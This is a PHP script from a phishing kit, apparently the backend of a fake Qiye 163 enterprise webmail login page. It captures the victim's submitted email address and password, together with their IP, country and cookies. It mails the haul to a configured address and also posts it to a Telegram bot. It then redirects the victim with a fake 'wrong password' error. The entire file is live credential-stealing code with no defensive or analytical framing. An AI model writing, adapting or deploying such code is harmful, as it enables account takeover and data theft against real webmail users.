<?php
include 'email.php';
$country = visitor_country();
$countryCode = visitor_countryCode();
$continentCode = visitor_continentCode();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$login = $_POST['acname'];
$passwd = $_POST['pass'];
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$cookies = json_encode($_COOKIE); 

$msg = "<b>Qiye Page Details</b>\n";
$msg .= "===================================================\n";
$msg .= "Email: <b>$login</b>\n";
$msg .= "Password: <b>$passwd</b>\n";
$msg .= "Country: $country | User IP: <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a>\n";
$msg .= "Cookies: $cookies\n"; 
$msg .= "=================Na x47 Get ham=================\n";
$send = $Receive_email;
$subject = "Login : $ip";
    	mail($send, $subject, $msg);   
    	echo $msg;
	$signal = 'ok';
	$msg = 'InValid Credentials';

if (empty($login) || empty($passwd)) {
    header("Location: mails.php?email=$login&zh_CN&webmailhost=mailhz.qiye.163.com&all_secure=1&ch=&module=&ua=&msg=ERR.LOGIN.PASSERR&from=hz");
} else {
    sendToTelegram($msg, $telegram_bot_token, $telegram_chat_id);
    header("Location: mails.php?email=$login&zh_CN&webmailhost=mailhz.qiye.163.com&all_secure=1&ch=&module=&ua=&msg=ERR.LOGIN.PASSERR&from=hz");
}

function sendToTelegram($message, $botToken, $chatId) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context  = stream_context_create($options);
    file_get_contents($url, false, $context);
}

function visitor_country() {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if ($ip_data && $ip_data->geoplugin_countryName != null) {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}

function visitor_countryCode() {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if ($ip_data && $ip_data->geoplugin_countryCode != null) {
        $result = $ip_data->geoplugin_countryCode;
    }

    return $result;
}

function visitor_continentCode() {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if ($ip_data && $ip_data->geoplugin_continentCode != null) {
        $result = $ip_data->geoplugin_continentCode;
    }

    return $result;
}
?>